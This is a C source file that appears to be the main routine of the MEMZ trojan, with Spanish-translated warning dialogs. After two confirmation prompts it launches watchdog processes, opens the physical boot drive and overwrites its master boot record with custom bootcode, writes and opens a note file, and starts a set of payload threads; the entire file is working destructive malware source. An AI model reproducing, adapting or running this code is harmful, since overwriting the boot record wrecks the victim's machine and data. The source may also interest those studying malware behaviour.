﻿#include "../MEMZ.h"

#ifndef CLEAN
void start() {
	int argc;
	LPWSTR *argv = CommandLineToArgvW(GetCommandLineW(), &argc);

	if (argc > 1) {
		if (!lstrcmpW(argv[1], L"/watchdog")) {
			CreateThread(NULL, NULL, &watchdogThread, NULL, NULL, NULL);

			WNDCLASSEXA c;
			c.cbSize = sizeof(WNDCLASSEXA);
			c.lpfnWndProc = watchdogWindowProc;
			c.lpszClassName = "hax";
			c.style = 0;
			c.cbClsExtra = 0;
			c.cbWndExtra = 0;
			c.hInstance = NULL;
			c.hIcon = 0;
			c.hCursor = 0;
			c.hbrBackground = 0;
			c.lpszMenuName = NULL;
			c.hIconSm = 0;

			RegisterClassExA(&c);

			HWND hwnd = CreateWindowExA(0, "hax", NULL, NULL, 0, 0, 100, 100, NULL, NULL, NULL, NULL);

			MSG msg;
			while (GetMessage(&msg, NULL, 0, 0) > 0) {
				TranslateMessage(&msg);
				DispatchMessage(&msg);
			}
		}
	} else {
		// Another very ugly formatting
		if (MessageBoxA(NULL, "El software que acabas de ejecutar está considerado como malware.\r\n\
Este malware danara tu computadora y la volvera inutilizable.\r\n\
Si estas viendo este mensaje sin saber lo que ejecutaste, simplemente presiona No y no pasara nada.\r\n\
Si sabes lo que hace este malware y estás usando un entorno seguro para probarlo, \
presiona Si para iniciarlo.\r\n\r\n\
¿DESEAS EJECUTAR ESTE MALWARE, RESULTANDO EN UNA MAQUINA INUTILIZABLE?", "MEMZ- traducido por manuelll4000", MB_YESNO | MB_ICONWARNING) != IDYES ||
MessageBoxA(NULL, "¡ESTA ES LA ULTIMA ADVERTENCIA!\r\n\r\n\
¡EL CREADOR NO SE HACE RESPONSABLE DE NINGÚN DANO OCASIONADO POR ESTE MALWARE!\r\n\
¿AUN DESEAS EJECUTARLO?", "MEMZ- traducido por manuelll4000", MB_YESNO | MB_ICONWARNING) != IDYES) {
			ExitProcess(0);
		}

		wchar_t *fn = (wchar_t *)LocalAlloc(LMEM_ZEROINIT, 8192*2);
		GetModuleFileName(NULL, fn, 8192);

		for (int i = 0; i < 5; i++)
			ShellExecute(NULL, NULL, fn, L"/watchdog", NULL, SW_SHOWDEFAULT);

		SHELLEXECUTEINFO info;
		info.cbSize = sizeof(SHELLEXECUTEINFO);
		info.lpFile = fn;
		info.lpParameters = L"/main";
		info.fMask = SEE_MASK_NOCLOSEPROCESS;
		info.hwnd = NULL;
		info.lpVerb = NULL;
		info.lpDirectory = NULL;
		info.hInstApp = NULL;
		info.nShow = SW_SHOWDEFAULT;

		ShellExecuteEx(&info);

		SetPriorityClass(info.hProcess, HIGH_PRIORITY_CLASS);

		ExitProcess(0);
	}

	HANDLE drive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);

	if (drive == INVALID_HANDLE_VALUE)
		ExitProcess(2);

	unsigned char *bootcode = (unsigned char *)LocalAlloc(LMEM_ZEROINIT, 65536);

	// Join the two code parts together
	int i = 0;
	for (; i < mbrStage1Len; i++)
		*(bootcode + i) = *(mbrStage1 + i);
	for (i = 0; i < mbrStage2Len; i++)
		*(bootcode + i + 0x1fe) = *(mbrStage2 + i);

	DWORD wb;
	if (!WriteFile(drive, bootcode, 65536, &wb, NULL))
		ExitProcess(3);

	CloseHandle(drive);

	HANDLE note = CreateFileA("\\note.txt", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

	if (note == INVALID_HANDLE_VALUE)
		ExitProcess(4);

	if (!WriteFile(note, Note, NoteLen, &wb, NULL))
		ExitProcess(5);

	CloseHandle(note);
	ShellExecuteA(NULL, NULL, "notepad", "\\note.txt", NULL, SW_SHOWDEFAULT);

	for (int p = 0; p < nPayloads; p++) {
		Sleep(payloads[p].startDelay);
		CreateThread(NULL, NULL, payloads[p].payloadHost, &payloads[p], NULL, NULL);
	}

	for (;;) {
		Sleep(10000);
	}
}
#endif